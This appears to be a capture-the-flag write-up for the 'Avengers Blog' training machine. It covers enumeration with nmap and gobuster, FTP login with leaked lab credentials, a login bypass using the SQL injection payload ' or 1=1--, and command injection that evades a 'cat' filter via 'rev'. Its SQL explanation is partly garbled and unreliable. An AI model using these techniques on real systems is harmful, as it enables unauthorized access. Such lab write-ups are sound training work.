# Avengers Blog

Learn to hack into Tony Stark's machine! You will enumerate the machine, bypass a login portal via SQL injection and gain root access by command injection.

# [Task 2] Cookies

## #2.1 - Instructions

HTTP Cookies is a small piece of data sent from a website and stored on the user's computer by the user's web browser while the user is browsing. They're intended to remember things such as your login information, items in your shopping cart or language you prefer.

Advertisers can use also tracking cookies to identify which sites you've previously visited or where about's on a web-page you've clicked. Some tracking cookies have become so intrusive, many anti-virus programs classify them as spyware.

You can view & dynamically update your cookies directly in your browser. To do this, press F12 (or right click and select Inspect) to open the developer tools on your browser, then click Application and then Cookies. 

## #2.2 - On the deployed Avengers machine you recently deployed, get the flag1 cookie value

Connect with http://10.10.3.186/ and fire up the web developer bar. Under Storage > Cookie > http://10.10.3.186, you will see a cookie named `flag1` with a value of `cookie_secrets`:

!["flag1"](files/flag1.png)

# [Task 3] HTTP Headers

## 3.0 - Instructions

HTTP Headers let a client and server pass information with a HTTP request or response. Header names and values are separated by a single colon and are integral part of the HTTP protocol.

!["GlCdRIM.png"](files/GlCdRIM.png)

The main two HTTP Methods are POST and GET requests. The GET method us used to request data from a resource and the POST method is used to send data to a server.

We can view requests made to and from our browser by opening the Developer Tools again and navigating to the Network tab. Have this tab open and refresh the page to see all requests made. You will be able to see the original request made from your browser to the web server. 

## 3.1 - Look at the HTTP response headers and obtain flag 2.

Use BurpSuite to intercept the traffic or curl (with the `-D` flag), to view the response header:

~~~
$ curl -D header.txt "http://10.10.3.186"
$ cat header.txt 
HTTP/1.1 200 OK
X-Powered-By: Express
flag2: headers_are_important
Content-Type: text/html; charset=utf-8
Content-Length: 7292
ETag: W/"1c7c-b4Vh59Xa/FV0DZE2ey13jTNNa4A"
Set-Cookie: connect.sid=s%3A7zudaX9gHJ4hwOGRf25ownkKRTGYIGLL.%2BVKnE3ZszkOgMLVgFNwaqyCMs%2F%2B%2BQDO5YgjjemeMEFQ; Path=/; HttpOnly
Date: Fri, 15 May 2020 15:40:40 GMT
Connection: keep-alive
~~~

Answer: `headers_are_important`

# [Task 4] Enumeration and FTP

## #4.0 - Instructions

In this task we will scan the machine with nmap (a network scanner) and access the FTP service using reusable credentials.

Lets get started by scanning the machine, you will need nmap. If you don't have the application installed you can control a Kali Linux machine with nmap pre-installed, in your browser.

In your terminal, execute the following command:

~~~
nmap <machine_ip> -v
~~~

This will scan the machine and determine what services on which ports are running. For this machine, you will see the following ports open:

~~~
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
~~~

* Port 80 has a HTTP web server running on
* Port 22 is to SSH into the machine
* Port 21 is used for FTP (file transfer)

We've accessed the web server, lets now access the FTP service. If you read the Avengers web page, you will see that Rocket made a post asking for Groot's password to be reset, the post included his old password too!

In your terminal, execute the following command:

~~~
ftp <machine_ip>
~~~

We will be asked for a username (`groot`) and a password (`iamgroot`). We should have now successfully logged into the FTP share using Groots credentials!

*Hint: You might have to enter passive mode when accessing the FTP share.*

## #4.1 - Look around the FTP share and read flag 3!

We first scan the machine:

~~~
$ nmap -sV -sC -A 10.10.3.186
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 17:26 CEST
Nmap scan report for 10.10.3.186
Host is up (0.076s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1a:f4:32:5b:dc:f6:4e:8f:72:2c:ce:39:db:2d:b6:e2 (RSA)
|   256 35:2f:c4:02:7a:62:88:29:24:b6:46:87:c5:71:2b:4c (ECDSA)
|_  256 dc:77:a5:14:18:73:03:71:04:80:40:99:7e:13:bb:81 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Avengers! Assemble!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
~~~

We confirm that 3 ports are open, 1 of which being FTP. We are provided with the credentials, let's connect and list the files:

~~~
$ ftp 10.10.3.186
Connected to 10.10.3.186.
220 (vsFTPd 3.0.3)
Name (10.10.3.186:unknown): groot
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              33 Oct 04  2019 flag3.txt
226 Directory send OK.
ftp> get flag3.txt
local: flag3.txt remote: flag3.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag3.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (15.3900 kB/s)
ftp> quit
221 Goodbye.
$ cat flag3.txt 
8fc651a739befc58d450dc48e1f1fd2e
~~~

# [Task 5] GoBuster

## 5.1 - Instructions

Lets use a fast directory discovery tool called GoBuster. This program will locate a directory that you can use to login to Mr. Starks Tarvis portal!

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.

You can either download GoBuster, or use the Kali Linux machine that has it pre-installed.

Lets run GoBuster with a wordlist (on Kali they're located under `/usr/share/wordlists`):

~~~
gobuster dir -u http://<machine_ip> -w <word_list_location>
~~~

## 5.1 - What is the directory that has an Avengers login?

Let's start gobuster:

~~~
$ gobuster dir -u http://10.10.3.186 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.3.186
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/15 17:52:29 Starting gobuster
===============================================================
/assets (Status: 301)
/css (Status: 301)
/Home (Status: 302)
/home (Status: 302)
/img (Status: 301)
/js (Status: 301)
/logout (Status: 302)
/portal (Status: 200)
===============================================================
2020/05/15 17:53:24 Finished
===============================================================
~~~

We discover that the login page is available under the `/portal` directory:

!["login portal"](files/login-portal.png)

# [Task 6] SQL Injection

## #6.0 - Instructions

You should now see the following page above. We're going to manually exploit this page using an attack called SQL injection.

SQL Injection is a code injection technique that manipulates an SQL query. You can execute you're own SQL that could destroy the database, reveal all database data (such as usernames and passwords) or trick the web server in authenticating you.

To exploit SQL, we first need to know how it works. A SQL query could be `SELECT * FROM Users WHERE username = {User Input} AND password = {User Input 2}`, if you insert additional SQL as the `{User Input}` we can manipulate this query. For example, if I have the `{User Input 2}` as `' 1=1` we could trick the query into authenticating us as the `'` character would break the SQL query and `1=1` would evaluate to be true.

To conclude, having our first `{User Input}` as the username of the account and `{User Input 2}` being the condition to make the query true, the final query would be:
`SELECT * FROM Users WHERE username = `admin` AND password = "' 1=1"`

This would authenticate us as the admin user.

*Hint: Have the username and password as ' or 1=1-- (include the apostrophe)*

## #6.1 - Log into the Avengers site. View the page source, how many lines of code are there?

Let's inject `' or 1=1--` both in the username and password fields. The request will be:

We are now connected. Press `Ctrl+U` to view the source code. Scroll to the bottom of the page and get the number of lines: `223`.

# [Task 7] Remote Code Execution and Linux

## #7.0 - Instructions

You should be logged into the Jarvis access panel! Here we can execute commands on the machine.. I wonder if we can exploit this to read files on the system.

Try executing the `ls` command to list all files in the current directory. Now try joining 2 Linux commands together to list files in the parent directory: `cd ../; ls` doing so will show a file called `flag5.txt`, we can add another command to read this file: `cd ../; ls; cat flag5.txt`

But oh-no! The cat command is disallowed! We will have to think of another Linux command we can use to read it! 

*Hint: What Linux command can read a file content in reverse?*

## #7.1 - Read the contents of `flag5.txt`

The page is executing our commands. Let's first locate where flag5.txt is:

~~~
find / -name flag5.txt 2>/dev/null
~~~

It returns:

~~~
/home/ubuntu/flag5.txt
~~~

Let's try to cat the flag:

~~~
cat /home/ubuntu/flag5.txt
~~~

which returns:

~~~
Command disallowed
~~~

Same with tail, grep, more, less, ... OK, let's find another way to dump our file:


Read the flag in reverse order and reverse the result:

~~~
rev /home/ubuntu/flag5.txt | rev
~~~

will return the flag:

~~~
d335e2d13f36558ba1e67969a1718af7
~~~

Another way is to read the flag:

~~~
while read line; do echo $line; done < /home/ubuntu/flag5.txt
~~~
